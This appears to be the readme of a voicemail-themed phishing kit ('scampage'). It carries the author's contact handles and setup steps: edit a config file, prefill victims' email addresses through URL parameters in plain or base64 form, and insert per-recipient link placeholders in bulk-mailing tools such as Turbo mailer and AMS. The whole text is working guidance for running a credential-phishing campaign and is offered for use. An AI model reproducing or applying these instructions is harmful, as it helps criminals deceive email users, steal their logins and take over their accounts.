/* 
Voicemail Scmpage 2019 by Ex-Robotos
Email: ex.robotos@gmail.com
Facebook: facebook.com/Ex.Robotos
ICQ: 745771262
*/

1- edit config.php
2- This scampage support three email grab types
 + ?email= base64 / real email
 + ?target= base64 / real email
 + ?code= base64 / real email
3- Set up on sender
 + Turbo mailer: https://yourlink.com/patch/?yourgrab=%0%
 + AMS: https://yourlink.com/patch/?yourgrab=%RCPT_ADDRESS%
 + A-29 or B-29: https://yourlink.com/patch/{NEWAUTOLINK}
